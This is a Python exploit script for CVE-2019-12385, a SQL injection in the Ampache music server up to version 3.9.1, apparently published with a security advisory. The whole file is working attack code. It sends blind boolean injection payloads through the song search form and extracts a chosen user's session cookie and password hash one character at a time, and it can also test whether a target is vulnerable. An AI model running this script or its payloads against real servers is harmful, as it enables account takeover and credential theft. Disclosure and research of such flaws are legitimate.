#!/usr/bin/env python
#
# CVE-2019-12385.py - SQL Injection
#
# Software: Ampache <= 3.9.1
# Author:   Pablo Martinez (@xassiz) from BlackArrow
# Details:  https://github.com/blackarrowsec/advisories/tree/master/2019/CVE-2019-12385
# Web:      [www.blackarrow.net] - [www.tarlogic.com]
#


import re
import sys
import string
import requests
import argparse

class Ampawn():
    
    def __init__(self, url, cookie=None, proxy=None, debug=False):
        self.url = url
        self.cookies = { "ampache": cookie } if cookie else None
        self.proxy = proxy
        self.debug = debug        
        self.headers = {
            "X-Requested-With": "XMLHttpRequest", 
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36", 
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept-Encoding": "gzip, deflate", 
            "Connection": "close"
        }
    
    def check(self, payload):
        url = "%s/search.php?type=song" % self.url
        
        data = {
            "limit": "0", 
            "operator": "or",
            "rule_1": "last_play", 
            "rule_1_operator": "1", 
            "rule_1_input": "%s" % payload,
            "action": "search"
        }
        r = requests.post(url, headers=self.headers, cookies=self.cookies, data=data, proxies=self.proxy, allow_redirects=False)
        
        if r.status_code == 302:
            if r.headers.get('Location')[-10:] == '/login.php':
                print "[-] Auth failed"
                sys.exit(2)
        elif r.status_code != 200:
            print "[-] Error code: %d" % r.status_code
            sys.exit(3)
        
        return re.search('song_\d*"', r.text)

    def dump(self, pattern, size=26, charset=None):
        full = ''
        for p in range(size):
            c = charset
            
            while len(c) > 1:
                middle = len(c) // 2
                h0, h1 = c[:middle], c[middle:]
                payload = pattern % (p+1, h0.encode('hex'))
                c = h1 if self.check(payload) else h0
                        
            full += c
            
            if self.debug:
                print "[debug] Partial result: %s" % full

        return full
    
    def is_vulnerable(self):
        pattern  = '1))union select 1 from dual where %s--'
        return self.check(pattern % '1=1') and not self.check(pattern % '1=0')

    def get_user_session(self, condition):
        count = '1))union select 1 from dual where (select count(*) from session where %s)>0--' % condition
        if not self.check(count):
            return None
        else:        
            pattern = '1))union select 1 from (select 1 from session where %s and LOCATE(SUBSTR(id,%%d,1),BINARY 0x%%s)=0 order by expire DESC limit 1)t--' % condition
            return self.dump(pattern, size=26, charset=string.lowercase + string.digits)
        
    def get_user_password_hash(self, condition):
        count = '1))union select 1 from dual where (select count(*) from user where %s)=1--' % condition
        if not self.check(count):
            return None
        else:
            pattern = '1))union select 1 from user where %s and LOCATE(SUBSTR(password,%%d,1),BINARY 0x%%s)=0 limit 1--' % condition
            return self.dump(pattern, size=64, charset='abcdef0123456789')
            
    def get_username_by_id(self, id):                
        r = requests.get("%s/stats.php?action=show_user&user_id=%d" % (self.url, int(id)), headers=self.headers, cookies=self.cookies, proxies=self.proxy, allow_redirects=False)
        
        if r.status_code == 302:
            if r.headers.get('Location')[-10:] == '/login.php':
                print "[-] Auth failed"
                sys.exit(2)
        elif r.status_code != 200:
            print "[-] Error code: %d" % r.status_code
            sys.exit(3)
        
        try:
            res = re.search('Display Name</dt>\n(.*)even">\n(.*)<', r.text)
            return res.group(2).strip()
        except:            
            return None
        
 
if __name__ == '__main__':
    
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", help="URL of the target Ampache instance", required=True)
    parser.add_argument("--session", help="Session ID (if auth required)")
    parser.add_argument("--proxy", help="Proxy (optional)")
    parser.add_argument("--check", help="Check if target is vulnerable", action='store_true')
    parser.add_argument("--debug", help="Print debug information", action='store_true')
    parser.add_argument("--get-session", help="Dumps a user session cookie ", action='store_true')
    parser.add_argument("--get-password", help="Dumps a user password hash", action='store_true')
    parser.add_argument("--user", help="Target username (default: user with id=1)")
    parser.add_argument("--id", help="Target user id (default: user with id=1)")
    
    args = parser.parse_args()
   
    proxy = {'http':args.proxy, 'https':args.proxy} if args.proxy else None    
    
    if args.session:
        pwn = Ampawn(args.url, args.session, proxy=proxy, debug=args.debug)
    else:
        pwn = Ampawn(args.url, proxy=proxy, debug=args.debug)
    
    print "[+] Target: %s" % args.url
    
    if args.check:
        if pwn.is_vulnerable():
            print "[+] Target is vulnerable"
        else:
            print "[-] Target is not vulnerable"
        sys.exit(1)
    
    if args.user:
        condition = "username=0x%s" % args.user.encode('hex')
        print "[+] Retrieving info for user '%s'..." % args.user
    elif args.id:
        condition = "id=%s" % args.id
        print "[+] Retrieving info for user with id=%s..." % args.id
        username = pwn.get_username_by_id(args.id)
        if username:
            print "[+] Username: %s" % username
    else:
        condition = "id=1"
        args.id = 1
        print "[+] Retrieving info for user with id=1..."
        username = pwn.get_username_by_id(args.id)
        if username:
            print "[+] Username: %s" % username
        
    if args.get_session:
        if args.id:
            condition = 'username=(select username from user where %s)' % condition
        
        session_id = pwn.get_user_session(condition)
        if session_id:
            print "[+] Session = %s" % session_id
        else:
            print "[-] User has no active session"
    
    if args.get_password:
        hash = pwn.get_user_password_hash(condition)
        if hash:
            print "[+] Password = %s" % hash
        else:
            print "[-] User not found"
    
